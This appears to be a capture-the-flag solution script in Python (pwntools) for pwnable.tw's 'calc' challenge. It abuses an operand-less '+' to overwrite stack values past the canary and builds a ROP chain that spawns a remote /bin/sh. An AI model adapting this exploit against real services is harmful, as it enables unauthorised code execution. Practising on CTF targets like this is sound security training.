###operator without operand cause leak and modification of stack

from pwn import *

###Utils
def calc(target,value):
    r.sendline('+'+str(target))
    curval = int(r.recvline().strip())
    delta = value-curval
    if delta>0:
        r.sendline('+'+str(target)+'+'+str(delta))
    else:
        r.sendline('+'+str(target)+'-'+str(-delta))
    res = int(r.recvline().strip())
    if res!=value:
        raise Exception('Corrupted Value','Incorrect Result')
    return

###Useful Addr
bss = 0x80ecf80
return_addr_offset = 361

###ROPgadget
mov_eax_edx = 0x807cc01 #mov dword ptr [eax], edx ; ret
pop_eax = 0x805c34b     #pop eax ; ret
pop_ecx_ebx = 0x80701d1 #pop ecx ; pop ebx ; ret
pop_edx = 0x80701aa     #pop edx ; ret
syscall = 0x8049a21     #int 0x80

###Exploit
###Flaw in program design allow us to overwrite array pointer by a '+' with no leading number
###Thus may bypass canary and construct ROPchain directly
r = remote('chall.pwnable.tw',10100)
r.recvuntil('===\n')

###write /bin/sh to bss
calc(return_addr_offset+0x00,pop_eax)
calc(return_addr_offset+0x01,bss)
calc(return_addr_offset+0x02,pop_edx)
calc(return_addr_offset+0x03,u32(b'/bin'))
calc(return_addr_offset+0x04,mov_eax_edx)
calc(return_addr_offset+0x05,pop_eax)
calc(return_addr_offset+0x06,bss+4)
calc(return_addr_offset+0x07,pop_edx)
calc(return_addr_offset+0x08,u32(b'/sh\x00'))
calc(return_addr_offset+0x09,mov_eax_edx)

###write \x00 to bss+8
calc(return_addr_offset+0x0a,pop_eax)
calc(return_addr_offset+0x0b,bss+8)
calc(return_addr_offset+0x0c,pop_edx)
calc(return_addr_offset+0x0d,0)
calc(return_addr_offset+0x0e,mov_eax_edx)

###arrange arguments to point to their values
calc(return_addr_offset+0x0f,pop_edx)
calc(return_addr_offset+0x10,bss+8)
calc(return_addr_offset+0x11,pop_ecx_ebx)
calc(return_addr_offset+0x12,bss+8)
calc(return_addr_offset+0x13,bss)
calc(return_addr_offset+0x14,pop_eax)
calc(return_addr_offset+0x15,11)

###end program and perform syscall
calc(return_addr_offset+0x16,syscall)
r.sendline('')
r.interactive()


